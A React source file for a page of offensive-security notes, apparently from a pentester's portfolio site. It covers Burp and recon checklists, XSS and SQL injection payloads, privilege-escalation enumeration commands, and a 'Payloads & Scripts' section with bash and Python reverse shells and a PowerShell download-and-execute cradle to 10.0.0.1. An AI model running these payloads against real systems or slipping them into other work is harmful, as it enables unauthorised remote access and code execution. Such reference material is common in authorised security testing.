import Layout from "@/components/Layout";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";

const Notes = () => {
  return (
    <Layout>
      <div className="container mx-auto px-4 py-16">
        <div className="mb-12">
          <h1 className="mb-4 text-4xl font-bold tracking-tight">Notes</h1>
          <p className="text-lg text-muted-foreground">
            Structured documentation library covering offensive methodologies, checklists, and
            techniques.
          </p>
        </div>

        <Accordion type="single" collapsible className="space-y-4">
          <AccordionItem
            value="burp-methodology"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              Burp Suite Methodology
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Initial Setup</h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>Configure proxy and certificate installation</li>
                  <li>Set up target scope and exclusions</li>
                  <li>Enable relevant extensions (Logger++, Authorize, etc.)</li>
                </ul>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Systematic Testing</h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>Spider and map application functionality</li>
                  <li>Identify injection points and parameters</li>
                  <li>Test authentication and session management</li>
                  <li>Analyze authorization and access controls</li>
                </ul>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem
            value="recon-checklist"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              Recon Checklist
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Subdomain Enumeration</h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>subfinder, amass, assetfinder</li>
                  <li>Certificate transparency logs</li>
                  <li>DNS bruteforcing with massdns</li>
                </ul>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Port Scanning</h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>nmap comprehensive scan with service detection</li>
                  <li>masscan for rapid port discovery</li>
                  <li>Focus on common web ports and custom services</li>
                </ul>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem
            value="web-attacks"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              Web Attack Cheat Sheet
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">XSS Testing</h3>
                <code className="block rounded bg-background p-3 text-xs">
                  {'<script>alert(document.domain)</script>'}
                  <br />
                  {'<img src=x onerror=alert(1)>'}
                  <br />
                  {'\'" onclick="alert(1)"//'}
                </code>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">SQL Injection</h3>
                <code className="block rounded bg-background p-3 text-xs">
                  {`' OR 1=1--`}
                  <br />
                  {`' UNION SELECT NULL,NULL--`}
                  <br />
                  {`' AND 1=2 UNION SELECT table_name FROM information_schema.tables--`}
                </code>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem
            value="api-testing"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              API Testing Methodology
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  Information Gathering
                </h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>Identify API endpoints and documentation</li>
                  <li>Analyze request/response structure</li>
                  <li>Map authentication mechanisms</li>
                </ul>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Common API Attacks</h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>BOLA/IDOR - Test with different user IDs</li>
                  <li>Mass Assignment - Add unexpected parameters</li>
                  <li>Rate Limiting - Test for brute force protection</li>
                  <li>Authentication bypass - Test token validation</li>
                </ul>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem
            value="linux-privesc"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              Linux Privesc Techniques
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Enumeration</h3>
                <code className="block rounded bg-background p-3 text-xs">
                  sudo -l # Check sudo permissions
                  <br />
                  find / -perm -4000 2&gt;/dev/null # SUID binaries
                  <br />
                  getcap -r / 2&gt;/dev/null # File capabilities
                </code>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  Common Vectors
                </h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>Sudo misconfigurations and GTFOBins</li>
                  <li>SUID binaries with known exploits</li>
                  <li>Writable /etc/passwd or service files</li>
                  
                </ul>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem
            value="windows-privesc"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              Windows Privesc Techniques
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">Enumeration</h3>
                <code className="block rounded bg-background p-3 text-xs">
                  whoami /priv # Check privileges
                  <br />
                  net user # List users
                  <br />
                  sc query # List services
                </code>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  Common Vectors
                </h3>
                <ul className="ml-6 list-disc space-y-1 text-sm">
                  <li>Unquoted service paths</li>
                  <li>Weak service permissions</li>
                  <li>DLL hijacking opportunities</li>
                  <li>Token impersonation (SeImpersonate)</li>
                </ul>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem
            value="payloads"
            className="rounded-lg border border-operator-border bg-card px-6"
          >
            <AccordionTrigger className="text-lg font-semibold hover:text-accent">
              Payloads & Scripts
            </AccordionTrigger>
            <AccordionContent className="space-y-4 pt-4 text-muted-foreground">
              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  Reverse Shell One-Liners
                </h3>
                <code className="block rounded bg-background p-3 text-xs">
                  bash -i &gt;& /dev/tcp/10.0.0.1/4444 0&gt;&1
                  <br />
                  python -c 'import
                  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);
                  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
                </code>
              </div>
              <div>
                <h3 className="mb-2 font-semibold text-foreground">
                  PowerShell Download & Execute
                </h3>
                <code className="block rounded bg-background p-3 text-xs">
                  IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/payload.ps1')
                </code>
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </div>
    </Layout>
  );
};

export default Notes;
